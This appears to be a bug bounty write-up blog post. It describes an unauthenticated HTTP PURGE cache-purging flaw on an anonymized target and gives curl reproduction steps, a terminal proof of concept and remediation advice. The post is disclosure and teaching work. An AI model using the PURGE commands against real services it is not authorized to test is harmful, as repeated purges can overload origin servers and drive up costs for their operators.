---
title: "Bug Bounty Writeup: Unauthenticated Cache Purging via HTTP PURGE Method"
date: 2025-12-17 15:52:00 +0000
layout: post
categories:
  - Bug Bounty
tags:
  - writeups
  - bugbounty
  - cache
  - p5
  - bugcrowd
  - denial-of-service
---

## Overview

Hello everyone! Welcome back to another bug bounty writeup. Today, I'll be discussing an often-overlooked but impactful issue involving HTTP caching layers. I recently found an **Unauthenticated Cache Purging** vulnerability on a private Bugcrowd program, which was triaged as a P5.

While exploring the target's infrastructure, I discovered that their caching server (likely Varnish or Fastly based on the response headers) was exposing the HTTP `PURGE` method globally without any authentication checks. This misconfiguration allowed anyone to arbitrarily invalidate cached objects, potentially leading to increased bandwidth costs, server overload, and Denial of Service (DoS) attacks.

For responsible disclosure, all target constraints below have been anonymized.

- **Target Location**: `*.[REDACTED].io`
- **Target Category**: API Testing
- **VRT**: Other (Denial of Service / Cache Invalidation)
- **Priority**: P5
- **Bug URL**: `https://status.[REDACTED].io/`

---

## Description

Content Delivery Networks (CDNs) and caching proxies (like Varnish) use caching to store frequently accessed resources closer to the user. This dramatically reduces the load on backend web servers and improves response times. 

When backend content is updated, administrators need a way to clear the old cache. This is typically done using the HTTP `PURGE` method. However, `PURGE` requests **must** be strictly access-controlled (usually restricted to internal IP addresses or requiring special authentication headers). 

In this scenario, the target allowed *anyone* on the internet to issue a `PURGE` request. By repeatedly purging the cache, an attacker can force all subsequent requests to bypass the CDN and hit the origin server directly (Cache Miss). 

### Business Impact

- **Availability & Denial of Service**: Forcing all traffic to hit the origin server can overwhelm backend resources, leading to slow response times or a complete service outage.
- **Financial Cost**: CDNs charge based on bandwidth. Bypassing the cache repeatedly forces the backend to serve heavy assets, driving up infrastructure and bandwidth costs drastically.

---

## Steps to Reproduce

Testing for this vulnerability is straightforward but requires understanding response headers to confirm cache states (`HIT` vs. `MISS`).

### 1. Identify the Cache State
First, send a simple `GET` request to the target URL to observe the caching behavior. I recommend running it a few times to ensure the asset is actually cached.

```bash
curl -s -D - https://status.[REDACTED].io/ -o /dev/null
```
*Look for `x-cache: HIT` and increasing `x-cache-hits` counts.*

### 2. Issue the Unauthenticated PURGE Request
Next, change the HTTP method to `PURGE` and send the request to the exact same URL without any authentication tokens.

```bash
curl -X PURGE https://status.[REDACTED].io/
```
*If vulnerable, the server will respond with `{ "status": "ok" }` or a similar success message.*

### 3. Verify Cache Invalidation
Finally, send the initial `GET` request again.

```bash
curl -s -D - https://status.[REDACTED].io/ -o /dev/null
```
*If the purge was successful, the header will reset to `x-cache: MISS` and `x-cache-hits: 0`, confirming that the CDN had to fetch a fresh copy from the origin server.*

---

## Proof of Concept (PoC)

Here is the exact (anonymized) terminal interaction demonstrating the attack:

**1. Building up the cache (Notice `x-cache: HIT`):**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -s -D - https://status.[REDACTED].io/ -o /dev/null
HTTP/2 404
x-served-by: cache-hkg17921-HKG
x-cache: MISS
x-cache-hits: 0

┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -s -D - https://status.[REDACTED].io/ -o /dev/null
HTTP/2 404
x-served-by: cache-hkg17935-HKG
x-cache: HIT
x-cache-hits: 1

┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -s -D - https://status.[REDACTED].io/ -o /dev/null
HTTP/2 404
x-served-by: cache-hkg17922-HKG
x-cache: HIT
x-cache-hits: 2
```

**2. Executing the unauthenticated PURGE:**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -X PURGE https://status.[REDACTED].io/
{ "status": "ok", "id": "17930-[REDACTED]-[REDACTED]" }
```

**3. Verifying the Cache Miss (Cache was successfully invalidated):**
```http
┌──(h4ckmonkey㉿lenovo)-[~]
└─$ curl -s -D - https://status.[REDACTED].io/ -o /dev/null
HTTP/2 404
x-served-by: cache-hkg17935-HKG
x-cache: MISS
x-cache-hits: 0
```

---

## Conclusion & Remediation Advice

Repeated unauthenticated cache purges force all requests to bypass the cache and hit the backend. This drastically increases infrastructure resource consumption and operational costs while heavily impacting overall service availability.

### How to Fix:
To remediate this issue, organizations must restrict the HTTP `PURGE` (and `BAN`) methods at the CDN / Edge caching layer:
1. **IP Allowlisting:** Only allow `PURGE` requests from trusted, internal IP addresses (e.g., CI/CD pipelines, internal deployment servers).
2. **Authentication:** Require a strong, secret authentication header (e.g., `Fastly-Key` or a custom `X-Purge-Token`) for any `PURGE` requests originating externally.
3. **Method Restriction:** Drop or deny `PURGE` requests by default in the VCL (Varnish Configuration Language) or Edge logic.

### References & Further Reading
This is a known issue across many bug bounty platforms. For similar reports and further context, check out these HackerOne disclosures:
- [HackerOne Report #2679440](https://hackerone.com/reports/2679440)
- [HackerOne Report #1911568](https://hackerone.com/reports/1911568)

Thanks for reading! Always remember to test those HTTP methods—sometimes the simplest misconfigurations hide in plain sight. Happy hunting!
